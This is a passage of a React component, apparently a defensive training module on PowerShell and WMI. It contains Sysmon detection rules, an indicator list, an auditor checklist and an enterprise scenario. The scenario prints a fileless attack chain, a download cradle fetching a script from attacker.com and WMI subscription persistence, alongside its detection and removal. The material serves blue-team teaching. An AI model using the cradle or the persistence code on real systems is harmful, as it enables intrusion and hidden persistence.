                <div key={id} style={{ display: "flex", gap: "10px", marginBottom: "7px", alignItems: "flex-start" }}>
                  <div style={{ flexShrink: 0 }}>
                    <span style={{ ...S.badge(c), minWidth: "38px", display: "block", textAlign: "center" }}>{id}</span>
                    <span style={{ color: C.dim, fontSize: "9px", display: "block", textAlign: "center" }}>{log}</span>
                  </div>
                  <span style={{ color: C.dim, fontSize: "11px" }}>{desc}</span>
                </div>
              ))}
            </div>
          )}

          {monTab === "sysmon" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ SYSMON RULES — POWERSHELL & WMI DETECTION</div>
              <div style={S.code}>
{`<!-- Detect PS downloading content (Event 3): -->`}
{`<NetworkConnect onmatch="include">`}
{`  <Image condition="end with">powershell.exe</Image>`}
{`  <DestinationPort condition="is">80</DestinationPort>`}
{`</NetworkConnect>`}
{`<NetworkConnect onmatch="include">`}
{`  <Image condition="end with">powershell.exe</Image>`}
{`  <DestinationPort condition="is">443</DestinationPort>`}
{`</NetworkConnect>`}
{``}
{`<!-- Detect PS process with suspicious flags (Event 1): -->`}
{`<ProcessCreate onmatch="include">`}
{`  <CommandLine condition="contains">-EncodedCommand</CommandLine>`}
{`</ProcessCreate>`}
{`<ProcessCreate onmatch="include">`}
{`  <CommandLine condition="contains">-ExecutionPolicy bypass</CommandLine>`}
{`</ProcessCreate>`}
{`<ProcessCreate onmatch="include">`}
{`  <CommandLine condition="contains">-WindowStyle hidden</CommandLine>`}
{`</ProcessCreate>`}
{``}
{`<!-- WMI subscription events (Events 19/20/21): -->`}
{`<!-- Enable ALL WMI events: -->`}
{`<WmiEvent onmatch="include" />`}
{``}
{`<!-- WmiPrvSE spawning processes (Event 1): -->`}
{`<ProcessCreate onmatch="include">`}
{`  <ParentImage condition="end with">WmiPrvSE.exe</ParentImage>`}
{`</ProcessCreate>`}
{``}
{`<!-- Detect PS v2 usage (Event 1): -->`}
{`<ProcessCreate onmatch="include">`}
{`  <CommandLine condition="contains">-version 2</CommandLine>`}
{`  <Image condition="end with">powershell.exe</Image>`}
{`</ProcessCreate>`}
              </div>
            </div>
          )}

          {monTab === "iocs" && (
            <div>
              <div style={{ color: C.yellow, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ POWERSHELL & WMI IOC MATRIX</div>
              <div style={S.grid2}>
                {[
                  ["Event 4104 with IEX + DownloadString", "Download cradle executing remotely-hosted script. Highest-priority PS alert. Content decoded, AMSI allowed it but logging captured it.", C.red],
                  ["PS commandline with -EncodedCommand", "Base64-encoded command execution. Legitimate uses exist but require justification. Flag for review, alert on high-entropy base64 + -nop -bypass combination.", C.orange],
                  ["PS v2 invocation (-version 2)", "Explicit downgrade to bypass AMSI and Script Block Logging. No legitimate use case in managed environment. CRITICAL: remove PS v2 feature.", C.red],
                  ["Sysmon Event 19/20/21 (WMI subscription)", "WMI persistence created. Any non-baseline subscription is an IOC. Correlate 19+20+21 from same process within short time window.", C.red],
                  ["WmiPrvSE.exe spawning cmd.exe / powershell", "WMI-triggered code execution. Sysmon Event 1 parent = WmiPrvSE.exe is definitive indicator of WMI lateral movement or persistence firing.", C.red],
                  ["PS outbound HTTP/HTTPS to non-corporate IP", "Download cradle or C2 check-in. Powershell.exe should never initiate connections to internet without going through proxy. Sysmon Event 3 alert.", C.orange],
                  ["Event 4103 with Invoke-Expression cmdlet", "Module logging capturing IEX invocation. Check ScriptName — if empty or 'stdin', highly suspicious (interactive or injected).", C.orange],
                  ["OBJECTS.DATA hash change (WMI repository)", "WMI repository modified — possible new subscription or class registered. Hash file weekly. Change outside maintenance = investigate.", C.yellow],
                ].map(([t, d, c]) => (
                  <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "9px", marginBottom: "7px" }}>
                    <div style={{ color: c, fontSize: "11px", fontWeight: "700", marginBottom: "3px" }}>▸ {t}</div>
                    <div style={{ color: C.dim, fontSize: "10.5px" }}>{d}</div>
                  </div>
                ))}
              </div>
            </div>
          )}

          {monTab === "tools" && (
            <div style={S.grid2}>
              {[
                ["PowerShell Empire / Covenant (understand to defend)", "C2 frameworks using PS. Understanding IOCs they generate (pipe names, beacon patterns, staged payload format) is essential for tuning SIEM rules. Blue teams run these to test detections.", C.orange],
                ["Invoke-Obfuscation (understand to defend)", "PS obfuscation framework. Test AMSI + Script Block Logging effectiveness. Every technique produces detectable patterns — use to generate test data for SIEM rules.", C.red],
                ["PSScriptAnalyzer", "Static analysis for PowerShell scripts. Identifies dangerous patterns, bad practices. Use in CI/CD pipeline for PS scripts. Can integrate with VS Code.", C.teal],
                ["PowerShell Logging Analyzer", "Parse and analyse Script Block and Module logs at scale. Correlate across hosts. Custom SIEM queries using ElasticSearch + Kibana dashboards.", C.cyan],
                ["WMI-Activity Event Log (Microsoft-Windows-WMI-Activity/Operational)", "Native WMI activity logging. Events 5858, 5861 log WMI errors and subscription fires. Enable and forward to SIEM.", C.purple],
                ["Autoruns (-wmi flag)", "autorunsc.exe -a w -c -h -s — scans WMI subscriptions. Lists EventFilter/Consumer/Binding. Cross-references hashes with VirusTotal.", C.green],
              ].map(([t, d, c]) => (
                <div key={t} style={{ background: "#08090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "10px" }}>
                  <div style={{ color: c, fontWeight: "700", fontSize: "11px" }}>{t}</div>
                  <div style={{ color: C.text, fontSize: "11px", marginTop: "4px" }}>{d}</div>
                </div>
              ))}
            </div>
          )}
        </PB>

        {/* ── 10: Comparison ── */}
        <PB title="POWERSHELL vs BASH / PYTHON — SCRIPTING PLATFORM COMPARISON" icon="🐧" color={C.cyan}>
          <div style={{ display: "flex", gap: "8px", marginBottom: "14px", flexWrap: "wrap" }}>
            {["scripting","security","remoting","automation"].map(t => (
              <button key={t} style={S.tab(cmpTab === t, C.cyan)} onClick={() => setCmpTab(t)}>{t.toUpperCase()}</button>
            ))}
          </div>
          <div style={{ display: "grid", gridTemplateColumns: "1fr 20px 1fr 20px 1fr", gap: "0", alignItems: "start" }}>
            {[
              { title: "PowerShell", color: C.cyan, bg: "#00101a", data: {
                scripting: [["Language","Compiled .NET → CLR JIT IL"],["Object model","Everything is a .NET object"],["Pipeline","Object pipeline (typed)"],["Shell","Integrated shell + scripting"],["Version","PS 5.1 (Windows) / PS 7+ (cross-platform)"],["Typing","Dynamic + type accelerators"]],
                security: [["AMSI","Built-in content scanning at engine"],["Script Block Log","Event 4104 (deobfuscated content)"],["CLM","Constrained Language Mode (AppLocker)"],["Execution Policy","User preference only, NOT security"],["WDAC","Kernel-enforced script signing"]],
                remoting: [["Protocol","WS-Management (WinRM) over HTTP/HTTPS"],["Auth","Kerberos → NTLM → Certificate → CredSSP"],["Serialisation","PSObject → CLIXML (XML-based)"],["Ports","5985 (HTTP) / 5986 (HTTPS)"],["JEA","Role-constrained remoting sessions"]],
                automation: [["AD mgmt","Active-Directory module (built-in)"],["Registry","Drive-based: HKLM:, HKCU:"],["Files","Get-ChildItem, Copy-Item, etc."],["Sched tasks","ScheduledTasks module (built-in)"],["Packaging","PowerShell Gallery (PSGallery)"]],
              }},
              { title: "Bash (Linux)", color: C.green, bg: "#0a180a", data: {
                scripting: [["Language","Interpreted text → fork/exec"],["Object model","Text streams (stdin/stdout/stderr)"],["Pipeline","Text pipeline (untyped strings)"],["Shell","Interactive shell IS scripting"],["Version","Bash 5.x (most systems)"],["Typing","No typing — all strings"]],
                security: [["AMSI equiv","None built-in (SELinux/AppArmor at OS level)"],["Script logging","auditd execve() logging (coarser)"],["CLM equiv","rbash (restricted bash, bypassable)"],["Exec Policy","No concept — all scripts executable"],["Signing","No native script signing (gpg optional)]"]],
                remoting: [["Protocol","SSH (OpenSSH) — TCP 22"],["Auth","Key-based / Password / GSSAPI (Kerberos)"],["Serialisation","None — raw text streams"],["Ports","22 (SSH standard)"],["JEA equiv","ForceCommand in authorized_keys (limited)"]],
                automation: [["AD mgmt","sssd + ldaputils / adcli"],["Registry","Not applicable (/etc files)"],["Files","ls, cp, find, rsync, etc."],["Sched tasks","cron / systemd timers"],["Packaging","apt/yum/pip/npm (OS-level)"]],
              }},
            ].map(({ title, color, bg, data }) => (
              <div key={title} style={{ background: bg, border: `1px solid ${color}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color, fontWeight: "700", fontSize: "12px", marginBottom: "10px" }}>{title === "PowerShell" ? "⊞" : "🐧"} {title}</div>
                {(data[cmpTab] || []).map(([k, v]) => (
                  <div key={k} style={{ display: "flex", gap: "8px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, minWidth: "90px", fontSize: "10.5px" }}>{k}</span>
                    <span style={{ color: C.bright, fontSize: "10.5px" }}>{v}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
        </PB>

        {/* ── 11: Enterprise Scenario ── */}
        <PB title="ENTERPRISE SCENARIO — FILELESS ATTACK VIA PS + WMI PERSISTENCE" icon="⚠" color={C.orange} accent={C.orange + "44"}>
          <div style={{ color: C.red, fontWeight: "700", marginBottom: "12px", fontSize: "12px" }}>
            🔥 SCENARIO: Attacker Achieves Fileless Persistence via WMI Subscription, Detected Only via Sysmon Event 19
          </div>
          <div style={S.grid2}>
            <div>
              <div style={{ color: C.orange, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ ATTACK CHAIN (fully fileless)</div>
              <div style={S.code}>
{`# Attacker has PS shell on victim (domain user)`}
{``}
{`# Step 1: Download and execute in memory`}
{`$code = (New-Object Net.WebClient).DownloadString(`}
{`    'https://attacker.com/stage2.ps1')`}
{`[System.Text.Encoding]::Unicode.GetString(`}
{`    [Convert]::FromBase64String($code)) | iex`}
{`# Event 4104 fires with full decoded content!`}
{`# Sysmon Event 3: powershell.exe → attacker.com:443`}
{``}
{`# Step 2: Plant WMI persistence (no file, no reg key)`}
{`$filterArgs = @{`}
{`    Name='WindowsUpdate'`}
{`    EventNameSpace='root\cimv2'`}
{`    QueryLanguage='WQL'`}
{`    Query='SELECT * FROM __InstanceCreationEvent WITHIN 30`}
{`        WHERE TargetInstance ISA "Win32_LogonSession"'`}
{`}`}
{`$filter = Set-WmiInstance -Class __EventFilter`}
{`    -Namespace root\subscription -Arguments $filterArgs`}
{``}
{`$consumerArgs = @{`}
{`    Name='WindowsUpdate'`}
{`    CommandLineTemplate="powershell.exe -nop -w hidden `}
{`        -e [base64 of stage2]"`}
{`}`}
{`$consumer = Set-WmiInstance -Class CommandLineEventConsumer`}
{`    -Namespace root\subscription -Arguments $consumerArgs`}
{``}
{`Set-WmiInstance -Class __FilterToConsumerBinding`}
{`    -Namespace root\subscription`}
{`    -Arguments @{Filter=$filter;Consumer=$consumer}`}
{`# Sysmon Events 19, 20, 21 fire HERE`}
              </div>
            </div>
            <div>
              <div style={{ color: C.green, fontWeight: "700", marginBottom: "8px", fontSize: "11px" }}>▸ DETECTION + RESPONSE</div>
              <div style={S.code}>
{`# Detection: Sysmon Event 19 fired at 02:14 UTC`}
{`# EventFilter Name: 'WindowsUpdate' (suspicious name!)`}
{`# Query: logon session trigger`}
{``}
{`# Correlate: Sysmon Event 3 (02:11 UTC)`}
{`# powershell.exe → attacker.com:443`}
{`# → download cradle preceded subscription creation`}
{``}
{`# Event 4104 (02:11 UTC):`}
{`# Script block content = decoded stage2 payload`}
{`# Defender AMSI allowed it (zero-day or obfuscated)`}
{`# But 4104 captured the full deobfuscated content!`}
{``}
{`# Remediation:`}
{`# 1. Query and remove WMI subscription:`}
{`Get-WmiObject -Namespace root\subscription`}
{`    -Class __EventFilter`}
{`    | Where Name -eq 'WindowsUpdate' | Remove-WmiObject`}
{``}
{`Get-WmiObject -Namespace root\subscription`}
{`    -Class CommandLineEventConsumer`}
{`    | Where Name -eq 'WindowsUpdate' | Remove-WmiObject`}
{``}
{`# 2. Verify all three objects removed:`}
{`Get-WmiObject -Namespace root\subscription`}
{`    -Class __FilterToConsumerBinding`}
{``}
{`# 3. Kill active beacon, isolate host, reset user creds`}
{`# 4. Analyse 4104 content for IOCs`}
{`# 5. Hunt across fleet for same WMI subscription name`}
              </div>
            </div>
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["What made this detectable", "Sysmon Events 19/20/21 (WMI subscription). Without Sysmon, this attack would have been completely invisible — no file, no registry key, no service, not in Autoruns by default.", C.cyan],
              ["What AMSI/Logging captured", "Despite obfuscation, Event 4104 captured the fully-decoded stage2 content after AMSI scan. Network connection logged by Sysmon Event 3. Three independent evidence sources.", C.green],
              ["Prevention stack", "CLM via AppLocker (blocks PS .NET access) + Sysmon 19/20/21 SIEM alert + WMI namespace permission restriction + block outbound PS HTTP without proxy = layered prevention.", C.orange],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}33`, borderRadius: "4px", padding: "10px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "4px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
        </PB>

        {/* ── 12: Checklist + Summary ── */}
        <PB title="AUDITOR CHECKLIST + SUMMARY" icon="✓" color={C.green}>
          <div style={S.grid2}>
            {[
              [C.red, "PowerShell Logging — Non-Negotiable", [
                "Script Block Logging enabled (EnableScriptBlockLogging = 1) — verify via registry or GPO result",
                "Module Logging enabled with ModuleNames = * (all modules)",
                "Transcription enabled with OutputDirectory to SIEM-collected share",
                "Log forwarding: Microsoft-Windows-PowerShell/Operational → SIEM with 30-day retention",
                "PS v2 feature removed: Get-WindowsOptionalFeature -FeatureName MicrosoftWindowsPowerShellV2Root = Disabled",
              ]],
              [C.orange, "PowerShell Security Controls", [
                "AppLocker script rules deployed (enforces CLM for untrusted locations)",
                "Verify CLM active on all managed workstations: $ExecutionContext.SessionState.LanguageMode = ConstrainedLanguage",
                "WDAC policy deployed on high-security systems (stronger than AppLocker)",
                "Execution Policy set to AllSigned (GPO) — defense in depth, not primary control",
                "Protected Event Logging enabled for script block logs on sensitive systems",
              ]],
              [C.purple, "WMI Security", [
                "WMI event subscriptions baselined and audited monthly (root\\subscription namespace)",
                "Sysmon Events 19/20/21 alerting in SIEM — any new subscription outside baseline = CRITICAL",
                "WMI remote access restricted to management hosts via Windows Firewall (port 135)",
                "WMI-Activity operational log enabled and forwarded (Events 5858, 5861)",
                "OBJECTS.DATA hash baselined — monitor for changes outside maintenance windows",
              ]],
              [C.cyan, "SIEM Detection Rules Active", [
                "Alert: Event 4104 containing IEX + DownloadString / WebClient",
                "Alert: Event 4688 PowerShell with -enc / -nop / -bypass / -hidden flags",
                "Alert: Event 400 (PS engine start) showing version 2 host",
                "Alert: Sysmon Event 3 from powershell.exe to non-proxy external IP",
                "Alert: WmiPrvSE.exe spawning cmd.exe or powershell.exe (Sysmon Event 1)",
              ]],
            ].map(([c, title, items]) => (
              <div key={title} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "8px" }}>▸ {title}</div>
                {items.map(item => (
                  <div key={item} style={{ display: "flex", gap: "6px", marginBottom: "5px" }}>
                    <span style={{ color: C.dim, fontSize: "11px" }}>☐</span>
                    <span style={{ color: C.dim, fontSize: "11px" }}>{item}</span>
                  </div>
                ))}
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={S.grid3}>
            {[
              ["AMSI + 4104 = see through obfuscation", "Obfuscation hides source, not execution. AMSI scans the deobfuscated script block. Event 4104 logs the deobfuscated content. Together they defeat all source-level obfuscation techniques.", C.red],
              ["CLM removes .NET access = blocks most PS exploits", "Most PowerShell exploitation relies on Add-Type (inline C#) or direct .NET calls. CLM via AppLocker/WDAC removes these capabilities. The attacker is left with standard cmdlets only.", C.purple],
              ["WMI subscriptions = invisible without Sysmon 19/20/21", "No file, no registry, not in Autoruns by default. The ONLY reliable automated detector is Sysmon Events 19/20/21 forwarded to SIEM. Without these, WMI persistence can survive for months undetected.", C.orange],
            ].map(([t, d, c]) => (
              <div key={t} style={{ background: "#09090d", border: `1px solid ${c}22`, borderRadius: "4px", padding: "12px" }}>
                <div style={{ color: c, fontWeight: "700", fontSize: "11px", marginBottom: "5px" }}>▸ {t}</div>
                <div style={{ color: C.dim, fontSize: "11px" }}>{d}</div>
              </div>
            ))}
          </div>
          <hr style={S.sep} />
          <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "10px" }}>
            <div style={{ color: C.dim, fontSize: "11px" }}>
              <span style={{ color: C.green }}>NEXT MODULE →</span> Step 11: Windows Event Logging — EVTX, ETW, Sysmon, Log Forwarding, SIEM Integration & Forensic Analysis
            </div>
            <div style={{ display: "flex", gap: "8px" }}>
              <Pill c={C.green}>Step 10 Complete</Pill>
              <Pill c={C.purple}>12 Panels · PowerShell & WMI Mastered</Pill>
            </div>
          </div>
        </PB>

      </div>
    </div>
  );
}
